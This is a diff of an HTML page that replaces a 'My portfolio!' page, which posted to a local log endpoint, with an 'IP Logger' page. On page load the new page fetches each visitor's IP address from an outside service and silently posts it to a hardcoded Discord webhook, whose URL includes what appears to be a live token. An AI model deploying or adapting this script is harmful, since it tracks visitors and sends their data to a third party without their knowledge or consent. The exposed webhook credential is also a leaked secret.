@@ -1,25 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>HyperSec</title>
-  <script src="server.js"></script>
-  <script>
-    function logUser() {
-      fetch('/log', { method: 'POST' })
-        .then((response) => {
-          if (response.ok) {
-            console.log('User info logged successfully');
-          } else {
-            console.error('Error logging user info');
-          }
-        })
-        .catch((error) => {
-          console.error('Error logging user info:', error);
+    <title>IP Logger</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Function to get the visitor's IP address
+            function getIPAddress() {
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    var ip = data.ip;
+                    sendToWebhook(ip);
+                });
+            }
+
+            // Function to send the IP address to Discord webhook
+            function sendToWebhook(ip) {
+                var webhookUrl = "https://discord.com/api/webhooks/1201943878429577257/o1yNW-9fnWcP2SiwxIqjRZn3cW80V-rp6fAAyUw9F891i_QfkmApoY4PGdPm4ugE-kID";
+                var payload = {
+                    "content": "New visitor IP: " + ip
+                };
+
+                $.ajax({
+                    type: "POST",
+                    url: webhookUrl,
+                    data: JSON.stringify(payload),
+                    success: function() {
+                        console.log("IP address logged!");
+                    },
+                    dataType: "json"
+                });
+            }
+
+            // Call the function on page load
+            getIPAddress();
         });
-    }
-  </script>
+    </script>
 </head>
-<body onload="logUser()">
-  <h1>My portfolio!</h1>
+<body>
+    <h1>Welcome to the IP Logger</h1>
 </body>
 </html>
